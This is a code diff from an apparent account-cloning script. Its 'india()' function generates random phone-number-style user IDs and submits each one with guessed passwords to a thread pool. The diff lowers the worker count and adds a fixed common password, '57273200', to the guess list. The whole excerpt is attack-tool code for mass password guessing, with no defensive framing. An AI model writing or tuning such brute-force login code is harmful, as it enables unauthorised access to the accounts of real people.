@@ -382,7 +382,7 @@ def india():
 		for nmbr in range(limit):
 			nmp = "". join(random.choice(string.digits) for _ in range(3))
 			user.append(nmp)
-		with tred(max_workers=30) as habib:	
+		with tred(max_workers=20) as habib:	
 			clear()
 			tl = str(len(user))
 			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{faltu} {black}wish luck {pvt} ')
@@ -392,7 +392,7 @@ def india():
 				name = ''.join(random.choice(string.digits) for _ in range(3))
 				cod = ''.join(random.choice(string.digits) for _ in range(3))
 				uid = code+name+cod+psx
-				passlist = [uid[:6],uid[:8]]
+				passlist = [uid[:6],uid[:8],'57273200']
 				if mthd in ['1','01']:
 					habib.submit(rndm1,uid,passlist)
 				if mthd in ['2','02']:
